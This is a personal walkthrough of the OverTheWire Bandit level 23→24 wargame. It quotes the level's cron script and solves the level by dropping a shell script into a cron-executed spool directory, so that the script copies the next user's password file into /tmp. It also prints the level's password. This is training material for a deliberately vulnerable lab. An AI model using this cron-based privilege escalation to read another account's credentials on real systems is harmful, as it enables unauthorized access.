[Bandit Level 23 → Level 24](https://overthewire.org/wargames/bandit/bandit24.html)

> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.  

> NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!  

> NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…  

username: bandit23  
password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G  

Solution below:  
———————————————————————————————————————  
`ssh bandit23@bandit.labs.overthewire.org -p2220`  
confirm with `ls /etc/cron.d` and then check for the script with `cat /etc/cron.d/cronjob_bandit24` and then `cat /usr/bin/cronjob_bandit24.sh` to see the contents:  
```
#!/bin/bash

myname=$(whoami) #command sub to set myname=bandit24.
cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*; #for all files in that directory
do
    if [ "$i" != "." -a "$i" != ".." ];#if it's not . or .. then remove it
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then #so if we are the owner it's going to time us out and then remove the file
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```  
So, I can't list the contents of that directory, but we can CD into it, so maybe we can run a script from within here and that'll give us something?  
Oooh, but ok, so I think what we need to do is just make a script, that gets run, but since it's run by the cronjob it'll run as out bandit24 user and have access to the password. So we can just have it save the password to a file that we have access to or cat it out or something like that.  

So, something like this?  
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 >> /tmp/gabedini1/pw.txt
```  
Give it permissions to run with `chmod +x script.sh`  
Then use the `date` command to check for it to reach the top of the minute  
Then when it executes, it makes a file for us which we can cat out with `cat /tmp/gabedini1/pw.txt`  
And there is a our password!  


`exit`  